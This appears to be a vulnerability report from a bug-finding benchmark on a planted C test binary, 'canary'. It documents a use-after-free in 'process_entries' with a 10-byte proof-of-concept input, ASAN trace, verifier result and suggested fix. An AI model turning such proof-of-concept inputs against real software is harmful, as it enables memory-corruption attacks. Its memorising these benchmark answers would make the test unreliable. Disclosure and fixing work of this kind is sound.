## Summary

When `parse_name()` returns an error inside `process_entries()`, the code frees `e->payload` but (a) does not clear the dangling pointer and (b) erroneously marks the entry as `valid = 1`. The subsequent processing pass then guards on `entries[i].valid && entries[i].payload`, both of which are true, and dereferences the freed pointer — producing a deterministic heap-use-after-free read.

- **Binary:** `/target/bin/canary`
- **Source:** `/target/src/canary.c`
- **Function:** `process_entries`
- **Sink line (UAF read):** `canary.c:75`
- **Free site:** `canary.c:61`
- **Original allocation:** `canary.c:138` (in `parse_input`)
- **Severity:** High (deterministic UAF read; on a heap reuse this becomes a confused-deserialization / type-confusion primitive on `tag = entries[i].payload[0]`)

## Vulnerable code (paraphrased)

```c
// process_entries  (canary.c ~55-65)
if (entries[i].type == 1) {
    if (parse_name(&entries[i]) < 0) {
        free(entries[i].payload);   // canary.c:61  <-- frees
        entries[i].valid = 1;       // BUG: marked valid despite error
        // BUG: entries[i].payload not set to NULL
        continue;
    }
    entries[i].valid = 1;
}

// later, second pass over entries (canary.c ~73-77)
for (int i = 0; i < count; i++) {
    if (entries[i].valid && entries[i].payload) {
        uint8_t tag = entries[i].payload[0];   // canary.c:75  <-- UAF READ
        ...
    }
}
```

To reach the failing branch in `parse_name` without first triggering one of the other bugs, simply pass an entry with `length = 1`, which causes `parse_name` to return -1 at its very first check (`if (e->length < 2)`) — leaving the payload allocation alive to be freed and then re-read.

## Reproduction

```bash
printf '\x43\x4e\x52\x59\x01\x01\x01\x01\x00\x58' > /tmp/poc4.bin
/target/bin/canary /tmp/poc4.bin
```

10-byte PoC layout:

| Offset | Bytes         | Meaning                  |
|--------|---------------|--------------------------|
| 0      | `43 4E 52 59` | magic "CNRY"             |
| 4      | `01`          | version = 1              |
| 5      | `01`          | entry_count = 1          |
| 6      | `01`          | entry type = 1 (name)    |
| 7      | `01 00`       | declared length = 1 (LE) |
| 9      | `58`          | payload = 'X' (1 byte)   |

`parse_name` rejects on `length < 2` → payload freed at line 61 → second pass reads `payload[0]` at line 75 → UAF.

## ASAN output (key lines)

```
==ERROR: AddressSanitizer: heap-use-after-free on address 0x502000000030
READ of size 1 at 0x502000000030 thread T0
    #0 process_entries /target/src/canary.c:75
freed by thread T0 here:
    #1 process_entries /target/src/canary.c:61
previously allocated by thread T0 here:
    #1 parse_input    /target/src/canary.c:138
SUMMARY: AddressSanitizer: heap-use-after-free /target/src/canary.c:75 in process_entries
```

## Verification

Reproduces 3/3 runs with identical stack trace, free site, and allocation site. Verifier verdict: 5/5 PASS.

## Distinction from prior reports

- **Different from** parse_data:101 integer overflow (different function, different bug class — that's an OOB write via uint16 mul wrap).
- **Different from** parse_name:45 OOB read via name_len (different function, different bug class — heap-buffer-overflow vs. use-after-free; this PoC actually never reaches the memcpy in parse_name).
- **Different from** parse_input:138 ↔ parse_data:88 length/alloc desync (different bug class — that's heap-buffer-overflow read on a still-live allocation; this is a use-after-free on a freed allocation, and is detected in process_entries, not parse_data).

## Suggested fix

```c
if (parse_name(&entries[i]) < 0) {
    free(entries[i].payload);
    entries[i].payload = NULL;   // clear dangling pointer
    entries[i].valid   = 0;      // do NOT mark invalid entries valid
    continue;
}
```

Additionally, the second pass should be defensive: never trust both `valid` and `payload` independently — clearing `payload` on free, as above, makes the existing guard correct.
